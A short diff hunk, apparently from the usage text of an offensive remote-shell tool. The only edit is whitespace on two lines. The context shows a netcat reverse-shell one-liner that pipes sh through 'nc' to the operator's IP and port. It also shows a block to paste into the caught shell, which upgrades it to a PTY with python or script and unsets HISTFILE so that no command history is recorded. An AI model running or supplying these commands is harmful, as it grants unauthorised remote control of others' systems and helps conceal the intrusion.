@@ -10,8 +10,8 @@ Use one of these commands on the remote system:
     2. ${CDR}U=/tmp/.\$\$;rm -f \$U;touch \$U;(tail -f \$U|sh 2>&1|nc -n ${rip} ${rport} >\$U 2>&1 &)
 ${CN}Once connected, cut & paste the following into the _this_ shell:
 ${CF}-------------------------------------------------------------------------------${CDC}
-\"\$SHELL\" -c true || SHELL=\$(command -v bash) || SHELL=/bin/sh
-command -v python >/dev/null \\
+ \"\$SHELL\" -c true || SHELL=\$(command -v bash) || SHELL=/bin/sh
+ command -v python >/dev/null \\
     && exec python -c \"import pty; pty.spawn('\${SHELL:-sh}')\" \\
     || { command -v script >/dev/null && exec script -qc \"\${SHELL:-sh}\" /dev/null; }
 unset HISTFILE
